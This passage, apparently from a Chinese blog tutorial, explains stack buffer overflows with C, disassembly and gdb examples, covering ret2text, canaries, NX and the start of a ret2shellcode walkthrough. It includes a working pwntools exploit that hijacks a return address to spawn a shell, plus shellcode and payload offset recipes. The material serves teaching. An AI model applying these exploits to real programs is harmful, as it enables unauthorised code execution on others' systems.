-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Job 1, &#x27;./a.out&#x27; terminated by signal SIGSEGV (Address boundary error)</span><br></pre></td></tr></table></figure>
-<p>SIGSEGV是段错误。 我们可以追踪一下哪里出了问题。</p>
-<p><img src="bad_test_asm1.jpg" /></p>
-<p>从gdb的调试中我们可以看到，<code>a[5] = 6;</code>这句话对应了<code>mov dword ptr [ebp], 6</code>这条指令。这条指令显然覆盖了<code>EBP</code>位置上面的值，这个值如果看上面的图的话，应该就能够发现这个地址上就是<code>main</code>函数的基址。</p>
-<p>在<code>leave</code>指令之后，<code>main</code>函数的<code>ebp</code>的值是0x2。</p>
-<p>我们把程序调试到那个位置上：</p>
-<p><img src="bad_test_asm2.jpg" /></p>
-<p>下一步是<code>push   dword ptr [ebp - 0xc]</code>，可是<code>EBP</code>的值是0x6！</p>
-<p>很明显：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br></pre></td></tr></table></figure>
-<p>段错误。在<code>main</code>函数试图访问某个地址的时候出现了问题——<code>main</code>函数并不知道自己的<code>ebp</code>已经被修改了，它仍在试图去访问基于<code>ebp</code>偏移的栈上的变量——而这个内存地址现在是不合法的了。</p>
-<p>前面是修改了栈基址，如果我们能够更进一步去修改返回地址呢？</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bad_test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">5</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">    a[<span class="number">5</span>] = <span class="number">6</span>; <span class="comment">// 实际上这就是一个常见的数组越界访问的问题。</span></span><br><span class="line">    a[<span class="number">6</span>] = <span class="number">7</span>; <span class="comment">// 更过分了（</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">100</span>;</span><br><span class="line">    bad_test();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>根据上面的情况，我们可以猜到当函数执行<code>ret</code>的时候，会返回到一个错误的地址。</p>
-<p><img src="bad_test_stack.jpg" /></p>
-<p>在执行完函数中的赋值操作之后，程序的栈是这个样子。接下来在返回时，整个程序的栈更是惨不忍睹：</p>
-<p><img src="bad_test_corrupt_stack.jpg" /></p>
-<p>下面一步<code>ret</code>到的地方自然是无效的地址，程序在这之后就会崩溃。</p>
-<p>这个也就是所谓的“栈溢出”。</p>
-<h1 id="能不能利用">能不能利用</h1>
-<h2 id="控制流是不是出问题了">控制流是不是出问题了？</h2>
-<p><code>ret</code>指令会返回到现在栈顶上存放的地址。那么如果我们任意修改这个位置上的值，理论上也就能够让程序跳转到任意一个地方了。</p>
-<p>前面程序出现了SIGSEGV是因为执行的地址无效，我们现在需要的是填一个有效的地址进去：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">impossible</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;you can&#x27;t see me!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bad_test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">5</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">    a[<span class="number">6</span>] = &amp;impossible;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    bad_test();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>在运行之后，我们可以看到程序输出了：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ./a.out</span><br><span class="line">you can&#x27;t see me!</span><br><span class="line">fish: Job 1, &#x27;./a.out&#x27; terminated by signal SIGSEGV (Address boundary error)</span><br></pre></td></tr></table></figure>
-<p>很明显，<code>impossible</code>这个从来没被调用的函数被执行了。在执行完函数<code>bad_test</code>后，程序尝试返回到<code>main</code>函数。但是这个时候<code>main</code>函数的返回地址已经被替换成了<code>impossible</code>函数的地址——程序就会转而去执行这个<code>impossible</code>函数。</p>
-<p>这也就是说明了程序为什么会执行<code>impossible</code>函数。</p>
-<p>再进一步看，我们的程序是通过<code>ret</code>指令进入到<code>impossible</code>函数中的，和正常的函数调用并不一样——这时候并没有一个<code>call impossible</code>指令去把执行完之后的返回地址压入栈中。也就是说，程序执行完<code>impossible</code>之后，它就不知道该返回哪里了。本来在执行<code>impossible</code>函数的<code>ret</code>指令时，栈顶应该是调用方压好的返回地址，但是没人去做这件事，栈顶现在是先前某个函数执行过程中留下的痕迹。</p>
-<p>然后，程序就会跳转到这个不知道哪里的地方，接着程序就会崩溃。</p>
-<p>实际上我们可以做一些更有趣的事情：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">impossible</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;you can&#x27;t see me!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">impossible_too</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;you can&#x27;t see me too!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">impossible_too_too</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;you can&#x27;t see me too, too!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bad_test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">5</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">    a[<span class="number">6</span>] = &amp;impossible;</span><br><span class="line">    a[<span class="number">7</span>] = &amp;impossible_too;</span><br><span class="line">    a[<span class="number">8</span>] = &amp;impossible_too_too;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    bad_test();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>一个程序的栈中被溢出了多个地址，这是它输出发生的变化：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ./a.out</span><br><span class="line">you can&#x27;t see me!</span><br><span class="line">you can&#x27;t see me too!</span><br><span class="line">you can&#x27;t see me too, too!</span><br><span class="line">fish: Job 1, &#x27;./a.out&#x27; terminated by signal SIGSEGV (Address boundary error)</span><br></pre></td></tr></table></figure>
-<p>这张图可以来说明发生了什么——我们往地址中有意填充了一系列函数的返回地址，程序也就会顺着我们填充的地址来进行跳转。</p>
-<p><img src="stack_corrupt_chains.jpg" /></p>
-<p>这样子，我们构造了一条控制流来影响程序的运行。</p>
-<h2 id="如果有输入的话然后ret2text">如果有输入的话，然后ret2text</h2>
-<p>这样的话，如果这个程序有输入……</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">impossible</span><span class="params">()</span></span>&#123;</span><br><span class="line">    execve(<span class="string">&quot;/bin/sh&quot;</span>, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">// get shell</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bad_test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> input[<span class="number">16</span>];</span><br><span class="line">    gets(input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    bad_test();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><code>gets</code>函数的一个特点在于，它不会检查读入了多少字符。也就是说，尽管<code>input</code>只能放下16个char，gets也不会在输入了16个字符的时候停下来。</p>
-<p>那这样，多余的输入就会冲入栈上的剩余空间。</p>
-<p><img src="gets_stack_overflow.jpg" /></p>
-<p>如果我们去有意构造程序的输入，那我们也就能够去控制程序的运行。通过反编译工具，我们能够看到函数<code>impossible</code>的地址：</p>
-<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">08049186</span> &lt;impossible&gt;:</span><br><span class="line"> <span class="number">8049186</span>:       <span class="number">55</span>                      <span class="keyword">push</span>   <span class="built_in">ebp</span></span><br><span class="line"> <span class="number">8049187</span>:       <span class="number">89</span> e5                   <span class="keyword">mov</span>    <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line"> ......</span><br></pre></td></tr></table></figure>
-<p>我们就需要想法设法将<code>0x08049186</code>这个地址覆盖到<code>bad_test</code>函数的返回地址。来看这个函数的指令：</p>
-<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">080491a3 &lt;bad_test&gt;:</span><br><span class="line"> 80491a3:       <span class="number">55</span>                      <span class="keyword">push</span>   <span class="built_in">ebp</span></span><br><span class="line"> 80491a4:       <span class="number">89</span> e5                   <span class="keyword">mov</span>    <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line"> 80491a6:       <span class="number">83</span> ec <span class="number">18</span>                <span class="keyword">sub</span>    <span class="built_in">esp</span>,<span class="number">0x18</span></span><br><span class="line"> 80491a9:       <span class="number">83</span> ec 0c                <span class="keyword">sub</span>    <span class="built_in">esp</span>,<span class="number">0xc</span></span><br><span class="line"> 80491ac:       <span class="number">8d</span> <span class="number">45</span> e8                <span class="keyword">lea</span>    <span class="built_in">eax</span>,[<span class="built_in">ebp</span>-<span class="number">0x18</span>]</span><br><span class="line"> 80491af:       <span class="number">50</span>                      <span class="keyword">push</span>   <span class="built_in">eax</span></span><br><span class="line"> 80491b0:       e8 9b fe ff ff          <span class="keyword">call</span>   <span class="number">8049050</span> &lt;gets@plt&gt;</span><br><span class="line"> 80491b5:       <span class="number">83</span> c4 <span class="number">10</span>                <span class="keyword">add</span>    <span class="built_in">esp</span>,<span class="number">0x10</span></span><br><span class="line"> 80491b8:       <span class="number">90</span>                      <span class="keyword">nop</span></span><br><span class="line"> 80491b9:       c9                      <span class="keyword">leave</span>  </span><br><span class="line"> 80491ba:       c3                      <span class="keyword">ret</span>    </span><br></pre></td></tr></table></figure>
-<p>在调用<code>gets</code>函数之前，程序通过<code>lea eax, [ebx-0x18]</code>指令将<code>[ebx-0x18]</code>这个地址放入了<code>eax</code>寄存器中。接下来，<code>eax</code>被压入栈中。也就是传递给函数<code>gets</code>的参数是<code>eax</code>即<code>[ebx-0x18]</code>这个地址。这个地址实际上就是字符串读入的位置也就是变量<code>input</code>。</p>
-<p>那么如果我们读入0x18个字符，便会正好覆盖到ebx的位置上方：</p>
-<p><img src="test_gets1.jpg" /></p>
-<p>如果多覆盖一些则会溢出到返回地址中：</p>
-<p><img src="test_gets2.jpg" /></p>
-<p>可以看到程序返回到了我们写上去的地址：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  0x80491b5 &lt;bad_test+18&gt;    add    esp, 0x10</span><br><span class="line">  0x80491b8 &lt;bad_test+21&gt;    nop    </span><br><span class="line">  0x80491b9 &lt;bad_test+22&gt;    leave  </span><br><span class="line">► 0x80491ba &lt;bad_test+23&gt;    ret    &lt;0x37373737&gt; ; 0x37373737=&quot;7777&quot;</span><br></pre></td></tr></table></figure>
-<p>那么我们只需要去构造一个输入的字符串<code>"a"*(0x18 + 0x4) + addr(impossible)</code>就行了：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">target = process(<span class="string">&#x27;./a.out&#x27;</span>) <span class="comment"># 目标</span></span><br><span class="line"></span><br><span class="line">target_addr = <span class="number">0x08049186</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">28</span>+p32(target_addr)</span><br><span class="line"></span><br><span class="line">target.sendline(payload) <span class="comment"># 发送payload</span></span><br><span class="line">target.interactive() <span class="comment"># 开启交互</span></span><br></pre></td></tr></table></figure>
-<p>可见我们使得程序跳转到了<code>impossible</code>函数并运行了里面的<code>execve</code>命令。</p>
-<p><img src="gets_exp.jpg" /></p>
-<p>获取控制权，达成。这个例子实际上控制程序跳转到<code>.text</code>段中的已有的代码，这个手段也就是被称为<code>ret2text</code>。这种利用<code>ret</code>指令的跳转来构造特定控制流的方法叫做ROP（Return
-Oriented Programming）。</p>
-<h2 id="事实上安全检查关闭了">事实上安全检查关闭了</h2>
-<p>前面其实有一个问题并没有说明：在前面的测试中，安全检查是已经被关闭的。</p>
-<p>我们在使用gcc编译程序的时候，设置了<code>-fno-stack-protector</code>选项，这个操作禁用了栈溢出的防护。在编译时去掉这个选项，执行脚本时程序报错：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*** stack smashing detected ***: terminated</span><br></pre></td></tr></table></figure>
-<p>这个安全机制被称为canary（金丝雀）。过去在矿井中，一些矿工会携带一只金丝雀。因为金丝雀对矿井中的有毒气体非常敏感，当有毒气体浓度增加，金丝雀会中毒而死，而矿工可以得到警告逃离危险区域。</p>
-<p>对于这段程序：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bad_test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> input[<span class="number">4</span>];</span><br><span class="line">    gets(input);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>我们来看一下设置了canary之后程序的变化：</p>
-<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">08049186</span> &lt;bad_test&gt;:</span><br><span class="line"> <span class="number">8049186</span>:       <span class="number">55</span>                      <span class="keyword">push</span>   <span class="built_in">ebp</span></span><br><span class="line"> <span class="number">8049187</span>:       <span class="number">89</span> e5                   <span class="keyword">mov</span>    <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line">    <span class="comment">; 上面两行是正常的函数序言</span></span><br><span class="line"> <span class="number">8049189</span>:       <span class="number">83</span> ec <span class="number">18</span>                <span class="keyword">sub</span>    <span class="built_in">esp</span>,<span class="number">0x18</span></span><br><span class="line">    <span class="comment">; 建立函数的栈帧</span></span><br><span class="line"> 804918c:       <span class="number">65</span> a1 <span class="number">14</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">gs</span>:<span class="number">0x14</span></span><br><span class="line"> <span class="number">8049192</span>:       <span class="number">89</span> <span class="number">45</span> f4                <span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0xc</span>],<span class="built_in">eax</span></span><br><span class="line">    <span class="comment">; 这两条指令就是设置了canary</span></span><br><span class="line">    <span class="comment">; 从gs段读取了一个值放入eax，再把这个值写入栈[ebp-0xc]的位置</span></span><br><span class="line"> <span class="number">8049195</span>:       <span class="number">31</span> c0                   <span class="keyword">xor</span>    <span class="built_in">eax</span>,<span class="built_in">eax</span></span><br><span class="line"> <span class="number">8049197</span>:       <span class="number">83</span> ec 0c                <span class="keyword">sub</span>    <span class="built_in">esp</span>,<span class="number">0xc</span></span><br><span class="line"> 804919a:       <span class="number">8d</span> <span class="number">45</span> f0                <span class="keyword">lea</span>    <span class="built_in">eax</span>,[<span class="built_in">ebp</span>-<span class="number">0x10</span>]</span><br><span class="line"> <span class="number">804919d</span>:       <span class="number">50</span>                      <span class="keyword">push</span>   <span class="built_in">eax</span></span><br><span class="line"> 804919e:       e8 ad fe ff ff          <span class="keyword">call</span>   <span class="number">8049050</span> &lt;gets@plt&gt;</span><br><span class="line"> 80491a3:       <span class="number">83</span> c4 <span class="number">10</span>                <span class="keyword">add</span>    <span class="built_in">esp</span>,<span class="number">0x10</span></span><br><span class="line"> 80491a6:       <span class="number">90</span>                      <span class="keyword">nop</span></span><br><span class="line">    <span class="comment">; 函数实际功能的执行</span></span><br><span class="line"> 80491a7:       8b <span class="number">45</span> f4                <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0xc</span>]</span><br><span class="line"> 80491aa:       <span class="number">65</span> 2b <span class="number">05</span> <span class="number">14</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    <span class="keyword">sub</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> <span class="built_in">gs</span>:<span class="number">0x14</span></span><br><span class="line">    <span class="comment">; 将现在栈上的canary和来源的地方比较一下</span></span><br><span class="line"> 80491b1:       <span class="number">74</span> <span class="number">05</span>                   <span class="keyword">je</span>     80491b8 &lt;bad_test+<span class="number">0x32</span>&gt;</span><br><span class="line">    <span class="comment">; 如果相等就跳转到leave指令</span></span><br><span class="line"> 80491b3:       e8 a8 fe ff ff          <span class="keyword">call</span>   <span class="number">8049060</span> &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">    <span class="comment">; 否则执行__stack_chk_fail函数，也就是发现了栈溢出</span></span><br><span class="line"> 80491b8:       c9                      <span class="keyword">leave</span>  </span><br><span class="line"> 80491b9:       c3                      <span class="keyword">ret</span>   </span><br></pre></td></tr></table></figure>
-<p>如果程序出现栈溢出的话，在EBP和返回地址被覆盖之前，Canary就已经被改变了，这样程序的控制流就会转入<code>__stack_chk_fail</code>中，这个函数会执行错误处理操作并停止程序的继续运行，避免被攻击者利用。</p>
-<p>如果我们用checksec之类的工具来查看的话，可以看到程序的各个安全参数：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable      FILE</span><br><span class="line">Partial RELRO   Canary found    NX enabled      No PIE          No RPATH   No RUNPATH   83) Symbols       No    0               2               ret2text</span><br></pre></td></tr></table></figure>
-<h1 id="如果不是ret2text">如果不是ret2text</h1>
-<p>在实际的程序里一般是不会像上面那样留一个大大的<code>execve('/bin/sh')</code>的后门的。这种程序里没有直接留下可以被调用的代码的情况，可能得需要自己去构造一个后门来插进去。</p>
-<p>一种思路是<strong>ret2shellcode</strong>，也就是控制程序返回到我们设置的shellcode中。这个shellcode实际上就是我们设置的能够完成一些功能（比如说拿到权限）的一串代码。</p>
-<p>这种思路的实现条件还算是比较苛刻——我们shellcode设置的位置需要能够被执行。怎么去理解这个问题呢？</p>
-<p>现在许多系统都有数据执行保护（Data Execution Prevention,
-DEP），这个保护的作用是防止攻击者修改正在执行的程序指令。内存中的一些区块会有一个NX标记（<strong>N</strong>o
-E<strong>X</strong>ecution），表明这个区块是不可执行的。较多的情况下，一个程序应该满足能够被写入的区块不可被执行，能够被执行的区块不可被写入。</p>
-<p>上面一个程序checksec返回的结果就显示<code>NX enabled</code>，也就是说像栈这种可以被写入的区块上面的内容不可以被作为指令来执行。</p>
-<p>拿<a
-target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">这个</a>程序来说。</p>
-<p>拖进IDA反汇编之后得到：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No system for you this time !!!&quot;</span>);</span><br><span class="line">  gets(s);  <span class="comment">// 可以溢出</span></span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, s, <span class="number">0x64</span>u); <span class="comment">// 将栈上临时变量s里面的数据复制到buf2里面，buf2在bss段</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>通过checksec我们会看到程序基本上处于无保护的状态：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   79) Symbols       No    0               3               ret2shellcode</span><br></pre></td></tr></table></figure>
-<p>通过IDA查看可以发现变量<code>buf2</code>在<code>.bss</code>段上：</p>
-<p><img src="ret2shellcode.jpg" /></p>
-<p>通过gdb调试之后可以注意到这里是可以被执行的：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line"> 0x8048000  0x8049000 r-xp     1000 0      /home/syml/Temp/ret2shellcode</span><br><span class="line"> 0x8049000  0x804a000 r--p     1000 0      /home/syml/Temp/ret2shellcode</span><br><span class="line"> 0x804a000  0x804b000 rw-p     1000 1000   /home/syml/Temp/ret2shellcode &lt;==在这里</span><br><span class="line">                       ^ 可以被执行的</span><br></pre></td></tr></table></figure>
-<p>那么我们可以这样来进行攻击：构造一段可以被执行的shellcode，通过<code>gets</code>函数读入<code>s</code>变量中，同时产生一个栈溢出，让<code>main</code>函数的返回地址指向.bss段的<code>buf2</code>变量的位置。接下来程序会将<code>s</code>的shellcode复制到<code>buf2</code>中。这样，在main函数返回的时候，就会跳转到.bss段的<code>buf2</code>变量位置执行我们的shellcode。</p>
-<p>我们可以直接使用pwntools构造shellcode：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>
-<p>接下来就是构造栈溢出：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">804858c:       8d 44 24 1c             lea    eax,[esp+0x1c]</span><br><span class="line">8048590:       89 04 24                mov    DWORD PTR [esp],eax</span><br><span class="line">8048593:       e8 38 fe ff ff          call   80483d0 &lt;gets@plt&gt;</span><br></pre></td></tr></table></figure>
-<p>通过objdump查看main函数的汇编可以看到，在执行<code>gets</code>函数前被压入栈中的eax存放的就是字符串<code>char s[]</code>的地址。这个地址是相对于<code>esp</code>的偏移，而需要构造payload我们要知道相对于ebp的偏移。我们可以通过动态调试得到偏移：</p>
-<p><img src="ret2shellcode_offset.jpg" /></p>
-<p>可以看出来，<code>esp</code>相对于<code>ebp</code>的偏移是<code>0xffffcf58-0xffffced0=0x88</code>，<code>char s[]</code>相对于<code>esp</code>的偏移是<code>0x1c</code>，那么<code>char s[]</code>相对于<code>ebp</code>的偏移就是<code>0x88-0x1c=0x6c</code>。再加上<code>EBP</code>占据的4个字节，所以返回地址的位置就在偏移<code>0x70</code>的位置上。</p>
-<p>另外一种简单的方法是直接使用pwntools的功能：通过<code>pwn cyclic 200</code>这样的命令生成足够长度的字符串，输入进去之后会出现栈溢出，这个时候去查看<code>EIP</code>的值，通过<code>pwn cyclic -l &lt;pattern&gt;</code>就可以知道偏移。</p>
-<p>所以说构造的栈溢出的payload应该是：<code>shellcode+'A'补全0x70+buf的地址</code>。</p>
-<p>可以构造payload：</p>
